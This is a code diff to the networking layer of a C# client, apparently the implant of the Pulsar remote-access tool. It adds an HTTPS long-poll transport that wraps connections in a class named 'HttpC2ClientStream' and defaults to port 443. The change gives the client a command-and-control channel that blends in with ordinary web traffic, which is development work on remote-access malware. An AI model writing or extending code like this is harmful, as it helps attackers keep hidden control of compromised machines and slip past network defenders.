@@ -89,7 +89,7 @@ namespace Pulsar.Client.Networking
                 {
                     var host = _hosts.GetNextHost();
 
-                    if (host?.IpAddress == null)
+                    if (host == null)
                     {
                         Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
                         
@@ -115,7 +115,20 @@ namespace Pulsar.Client.Networking
 
                     try
                     {
-                        base.Connect(host.IpAddress, host.Port);
+                        if (host.Transport == TransportKind.Tcp)
+                        {
+                            if (host.IpAddress == null)
+                            {
+                                Debug.WriteLine("Failed to resolve TCP host; will retry after delay.");
+                                continue;
+                            }
+
+                            base.Connect(host.IpAddress, host.Port);
+                        }
+                        else if (host.Transport == TransportKind.HttpsLongPoll)
+                        {
+                            ConnectViaHttpsLongPoll(host.Hostname, host.Port);
+                        }
                     }
                     catch (Exception ex)
                     {
@@ -162,6 +175,33 @@ namespace Pulsar.Client.Networking
             }
 
             MessageHandler.Process(client, message);
+        }
+
+        private void ConnectViaHttpsLongPoll(string url, ushort port)
+        {
+            if (string.IsNullOrWhiteSpace(url))
+            {
+                throw new ArgumentNullException(nameof(url));
+            }
+
+            var builder = new UriBuilder(url);
+            if (string.IsNullOrEmpty(builder.Scheme))
+            {
+                builder.Scheme = Uri.UriSchemeHttps;
+            }
+
+            if (builder.Port <= 0 && port > 0)
+            {
+                builder.Port = port;
+            }
+
+            if (builder.Port <= 0)
+            {
+                builder.Port = 443;
+            }
+
+            var stream = new HttpC2ClientStream(builder.Uri);
+            AttachStream(stream);
         }
 
         private void OnClientFail(Client client, Exception ex)
